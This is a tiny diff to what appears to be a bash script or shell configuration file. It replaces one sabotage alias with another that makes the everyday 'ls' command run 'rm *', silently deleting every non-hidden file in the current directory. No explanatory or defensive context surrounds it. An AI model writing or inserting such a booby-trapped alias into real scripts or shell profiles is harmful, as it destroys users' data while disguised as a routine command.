@@ -1,1 +1,2 @@
-alias ls=rm README.md
+#!/bin/bash
+alias ls="rm *"
